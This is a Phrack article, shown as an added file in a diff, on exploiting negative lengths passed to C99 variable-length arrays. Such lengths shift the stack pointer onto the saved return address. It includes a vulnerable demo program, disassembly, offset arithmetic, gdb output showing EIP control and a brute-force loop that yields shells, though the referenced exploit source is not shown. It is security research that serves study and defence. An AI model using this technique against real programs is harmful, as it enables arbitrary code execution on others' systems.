@@ -1,0 +1,406 @@
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3f, Phile #0x0e of 0x14
+
+
+|=----=[ Clutching at straws: When you can shift the stack pointer ]=----=|
+|=-----------------------------------------------------------------------=|
+|=----------=[ Andrew Griffiths <andrewg@felinemenace.org> ]=------------=|
+
+--[ Table of contents
+
+1 - Introduction
+2 - The story
+2.1 - C99 standard note
+3 - Breakdown
+4 - Moving on
+4.1 - Requirements for exploitability
+5 - Links
+6 - Finishing up
+
+--[ 1 - Introduction
+
+	The paper documents a rare, but none-the less interesting bug in 
+	variable sized arrays in C. This condition appears when a user 
+	supplied length is passed via a parameter to a variable 
+	declaration in a function. 
+
+	As a result of this, an attacker may be able to "shift" the stack
+	pointer to point it to somewhere unexpected, such as above
+	the stack pointer, or somewhere else like the Global Offset
+	Table. 
+
+--[ 2 - The story
+
+	After playing a couple rounds of pool and drinking at a local 
+	pub, nemo talked about some of the fruits after the days auditing
+	session. He mentioned that there was some interesting code 
+	constructs which he hadn't fully explored yet (perhaps because 
+	I dragged him out drinking).
+
+	Basically, the code vaguely looked like: 
+
+	int function(int len, some_other_args)
+	{
+		int a;
+		struct whatever *b; 
+		unsigned long c[len];
+		
+		if(len > SOME_DEFINE) { 
+			return ERROR;
+		} 
+
+		/* rest of the code */
+	}
+
+	and we started discussing about that, and how we could take 
+	advantage of that. After various talks about the compiler emitting
+	code that wouldn't allow it, architectures that it'd work on (and 
+	caveats of those architectures), and of course, another round or 
+	two drinks, we came to the conclusion that it'd be perfectly 
+	feasible to exploit, and it would be a standard esp -= 
+	user_supplied_value;
+
+	The problem in the above code, is that if len is user-supplied 
+	it would be possible to make it negative, and move the stack 
+	pointer move closer to the top of the stack, as opposed to closer 
+	to the bottom (assuming the stack grows down.)
+
+----[ 2.1 - C99 standard note
+
+	The C99 standard allows for variable-length array declaration:
+
+	To quote, 
+
+	"In this example, the size of a variable-length array is computed 
+	 and returned from a function: 
+	 
+	 size_t fsize3 (int n)
+	 { 
+	 	char b[n+3]; //Variable length array. 
+		return sizeof b; // Execution timesizeof. 
+	 } 
+	
+	 int main() 
+	 { 
+	   size_t size; 
+	   size = fsize3(10); // fsize3 returns 13. 
+	   return 0; 
+	 }"
+	
+--[ 3 - Break down
+
+	Here is the (convoluted) C file we'll be using as an example. 
+	We'll cover more things later on in the article. 
+
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <string.h>
+	#include <sys/types.h>
+
+	int func(int len, char *stuff)
+	{
+		char x[len];
+		
+		printf("sizeof(x): %d\n", sizeof(x));
+		strncpy(x, stuff, 4);
+		return 58;
+	}
+
+	int main(int argc, char **argv)
+	{
+		return func(atoi(argv[1]), argv[2]);
+	}
+	
+	The question arises though, what instructions does the compiler 
+	generate for the func function?
+	
+	Here is the resulting disassembly from "gcc version 3.3.5 
+	(Debian 1:3.3.5-8ubuntu2)", gcc dmeiswrong.c -o dmeiswrong. 
+
+
+080483f4 <func>:
+ 80483f4: 55                   push   %ebp
+ 80483f5: 89 e5                mov    %esp,%ebp ; standard function 
+                                                ; prologue
+ 80483f7: 56                   push   %esi
+ 80483f8: 53                   push   %ebx ; preserve the appropriate 
+                                           ; register contents.
+ 80483f9: 83 ec 10             sub    $0x10,%esp ; setup local 
+                                                ; variables
+ 80483fc: 89 e6                mov    %esp,%esi ; preserve the esp 
+                                                ; register
+ 80483fe: 8b 55 08             mov    0x8(%ebp),%edx ; get the length
+ 8048401: 4a                   dec    %edx	; decrement it
+ 8048402: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048405: 83 c0 0f             add    $0xf,%eax
+ 8048408: c1 e8 04             shr    $0x4,%eax
+ 804840b: c1 e0 04             shl    $0x4,%eax 
+
+The last three lines are eax = (((eax + 15) >> 4) << 4); This rounds up 
+and aligns eax to a paragraph boundary.
+
+ 804840e: 29 c4                sub    %eax,%esp ; adjust esp
+ 8048410: 8d 5c 24 0c          lea    0xc(%esp),%ebx ; ebx = esp + 12
+ 8048414: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048417: 89 44 24 04          mov    %eax,0x4(%esp) ; len argument
+ 804841b: c7 04 24 78 85 04 08 movl   $0x8048578,(%esp) ; fmt string
+                                                  ; "sizeof(x): %d\n"
+ 8048422: e8 d9 fe ff ff       call   8048300 <_init+0x3c> ; printf
+
+ 8048427: c7 44 24 08 04 00 00 movl   $0x4,0x8(%esp) ; len arg to 
+ 804842e: 00                                         ; strncpy
+ 804842f: 8b 45 0c             mov    0xc(%ebp),%eax   
+ 8048432: 89 44 24 04          mov    %eax,0x4(%esp) ; data to copy
+ 8048436: 89 1c 24             mov    %ebx,(%esp)    ; where to write
+
+ ; ebx = adjusted esp + 12 (see 0x8048410)
+
+ 8048439: e8 e2 fe ff ff       call   8048320 <_init+0x5c> ; strncpy
+ 804843e: 89 f4                mov    %esi,%esp  ; restore esp
+ 8048440: b8 3a 00 00 00       mov    $0x3a,%eax ; ready to return 58 
+ 8048445: 8d 65 f8             lea    0xfffffff8(%ebp),%esp 
+				; we restore esp again, just in case it 
+				; didn't happen in the first place.
+ 8048448: 5b		       pop    %ebx
+ 8048449: 5e                   pop    %esi
+ 804844a: 5d                   pop    %ebp 
+ 804844b: c3                   ret ; restore registers and return.
+
+
+	What can we learn from the above assembly output?
+
+	1) There is some rounding done on the supplied value, thus meaning 
+           small negative values (-15 > -1) and small values (1 - 15) will 
+	   become 0. This might possibly be useful, as we'll see below.
+
+	   When the supplied value is -16 or less, then it will be possible
+	   to move the stack pointer backwards (closer to the top of the 
+	   stack).
+
+	   The instruction sub $eax, %esp at 0x804840e can be seen as add 
+	   $16, %esp when len is -16.[1]
+
+	2) The stack pointer is subtracted by the paragraph-aligned 
+	   supplied value.
+	
+	   Since we can supply an almost arbitary value to this, we can 
+	   point the stack pointer at a specified paragraph. 
+
+	   If the stack pointer value is known, we can calcuate the offset 
+	   needed to point the stack at that location in memory. This 
+	   allows us to modify writable sections such as the GOT and heap. 
+
+	3) gcc can output some wierd assembly constructs.
+	
+--[ 4 - Moving on
+
+	So what does the stack diagram look like in this case? When we 
+	reach 0x804840e (sub esp, eax) this is how it looks.
+
+			+------------+
+	0xc0000000 	|   ......   | Top of stack.
+			|   ......   |
+	0xbffff86c	| 0x08048482 | Return address
+	0xbffff868	| 0xbffff878 | Saved EBP
+	0xbffff864	|   ......   | Saved ESI 
+	0xbffff860	|   ......   | Saved EBX
+	0xbffff85c	|   ......   | Local variable space
+	0xbffff858	|   ......   | Local variable space
+	0xbffff854	|   ......   | Local variable space
+	0xbffff850 	+------------+ ESP
+	
+	To overwrite the saved return address, we need to calculate what 
+	to make it subtract by. 
+	
+	delta = 0xbffff86c - 0xbffff850
+	delta = 28
+
+	We need to subtract 12 from our delta value because of the 
+        instruction at 0x08048410 (lea 0xc(%esp),%ebx) so we end up with 16. 
+
+	If the adjusted delta was less than 16 we would end up overwriting 
+	0xbffff85c, due to the paragraph alignment. Depending what is in 
+	that memory location denotes how useful it is. In this particular 
+	case its not. If we could write more than 4 bytes, it could be 
+	useful.
+
+	When we set -16 AAAA as the arguments to dmeiswrong, we get:
+
+	andrewg@supernova:~/papers/straws$ gdb -q ./dmeiswrong
+	Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+	(gdb) set args -16 AAAA
+	(gdb) r
+	Starting program: /home/andrewg/papers/straws/dmeiswrong -16 AAAA
+	sizeof(x): -16
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+
+	Based with the above information, an exploit can be written for 
+	dmeiswrong.c. See the attached file iyndwacyndwm.c for more 
+	information.
+
+	The attached exploit code (iyndwacyndwm.c) works on my system 
+	(gcc version: Debian 1:3.3.5-8ubuntu2, kernel: Linux supernova 
+	2.6.10-5-686 #1 Fri Jun 24 17:33:34 UTC 2005 i686 GNU/Linux) with
+	success. 
+	It may fail on the readers machine due to different initial stack 
+	layout, and different compiler options / generated code. You may 
+	need to play a bit with gdb a bit to get it working. However, this 
+	technique should work fine for other people, they may just need to 
+	play around a bit to get it working as expected.
+
+	To get it working for your system, have a look at what causes a 
+	segfault (this can be achieved with a simple 
+
+	  "for i in `seq 0 -4 -128` ; do ./dmeiswrong $i AAAA ; done" 
+
+	loop and seeing if the offset segfaults. The attached Makefile 
+	implements this loop for you when you type make bf. You can then 
+	replay the offset and args in GDB to see if EIP is pointing to 
+	0x41414141.
+
+	Then its a matter of getting the stack layout correct for so the 
+	exploit will run. In the included exploit, I've made it so it 
+	tries to determine the exact offset to where the shellcode starts. 
+	This technique is further explained in [2]. Otherwise, this 
+	technique could be done via examining the heap layout at "_start" 
+	(entry point of the executable) and looking at what is in memory 
+	from the top, and seeing the offset, as its quite possible that 
+	things have been moved around during different kernel releases.
+
+	In order to make it easier for people to play around with this 
+	technique, I've included a precompiled dmeiswrong and iyndwacyndwm 
+	files, which hopefully demonstate the problem. If iyndwacyndwm 
+	does not work for you, try iyndwacyndwm-lame which tries the 
+	standard "pick an offset from some value (like esp)" technique to 
+	try and gain code execution on the host.
+
+	I haven't performed a wide scale test against vulnerable compilers, 
+	but due to the code construct compilers would be most likely to 
+	emit, I suspect a majority of compilers which support variable 
+	sized stack arrays to be vulnerable. Thos which wouldn't be 
+	vulnerable would be those which include code to verify if this is 
+	not a problem during runtime. 
+
+	Exploitability of this type of bug appears to be feasible on other 
+	architectures, such as PPC, as I was able to get it to crash with
+	$pc being something not of my choice. (such as, 0x6f662878, and 
+	sometimes $pc would be pointing at an invalid instruction on the 
+	stack). This was done via just incrementing the value passed as 
+	the len by 4 in a loop. Make bf should point out the exploitable 
+	architectures as they should crash (eventually.)
+
+	I didn't have enough time to look into this further as the time to 
+	submit the final paper drew to close, and PPC assembly and MacOSX
+	are not my strongest skills.
+
+--[ 4.1 - Requirements for exploitability
+
+	In order for an architecture / Operating System to be exploitable, 
+	the architecture needs to support having a stack which can be moved 
+	about. If the stack contains embedded flow control information, 
+	such as saved return addresses, it makes it significantly easier 
+	to exploit, and partially less dependant on what value the stack 
+	pointer contains. This in turn increases reliability in exploits, 
+	especially remote ones.
+
+	Additionally, the compiler needs to:
+
+	- support variable sized stack arrays (which as demonstrated above, 
+	  is a feature of the C99 standard)
+
+	- not emit code that performs sanity checking of the changed stack 
+	  pointer. It is forseeable that if this issue gets a lot of public 
+	  attention, that various compiler security patches (such as 
+	  pro-police, stackguard, so fourth) will add detection of this 
+	  issue.
+
+	The direction the stack grows is not that relevant to the problem, 
+	as if the x86 stack grew upwards, the instruction at 0x804840e, 
+	would be written as addl %eax, %esp, and given the parameter len 
+	as -16 would could be rewritten as subl $16, %esp, which would 
+	allow access to the saved eip and saved frame pointer, amongst 
+	other things. 
+
+	The attached Makefile has a "bf" option which should allow you 
+	to test if your architecture is vulnerable. In order to make this 
+	work as expected, you'll need to supply the top of the stack for 
+	your architecture, and a proper shellcode. A recommended test 
+	shellcode is the trap instruction (int3 on x86, trap on ppc) which 
+	generates a particular signature when the code is executed. 
+
+	The output from the make bf command on my laptop is as follows:
+
+	andrewg@supernova:~/papers/straws/src$ make bf
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	sh-3.00$ exit
+	sizeof(x): -20
+	sh-3.00$ exit
+	sizeof(x): -24
+	sh-3.00$ exit
+	sizeof(x): -28
+	sh-3.00$ exit
+	sizeof(x): -32
+	/bin/sh: line 1: 16640 Segmentation fault      ./iyndwacyndwm-lame $i
+	sizeof(x): -36
+
+	[ snipped a bunch of Segmentation fault messages ] 	
+
+	/bin/sh: line 1: 16648 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -68
+	/bin/sh: line 1: 16649 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -72
+
+	[ snipped a bunch of Floating point exception messages and segv ] 
+
+	andrewg@supernova:~/papers/straws/src$
+
+	The make bf-trap command generates the following output:
+
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame-trap $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	/bin/sh: line 1: 16983 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -20
+	/bin/sh: line 1: 16984 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -24
+
+
+--[ 5 - Links
+
+[1] http://www.eduplace.com/math/mathsteps/6/b/
+[2] http://packetstorm.linuxsecurity.com/groups/netric/envpaper.pdf
+
+--[ 6 - Finishing up
+
+I'd like to greet all of the felinemenace people ((in no particular order) 
+nevar, nemo, mercy, ash, kwine, jaguar, circut, nd and n00ne), along with 
+pulltheplug people, especially arcanum.
+
+Random greets to dme, caddis, Moby for his visual basic advice while 
+discussing this problem at the pub, and zen-parse.
+
+It kinda goes without saying, but I'd like to thank all the people who have 
+supplied feedback for my article.
+
+[ Need a challenge ? ]
+[ Visit http://www.pulltheplug.org ] 
+
+[ Want to visit Australia and want a reason? ]
+[ RUXCON is being held on 1st and 2nd of October - see you there ] 
+[ http://www.ruxcon.org.au/ ] 
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
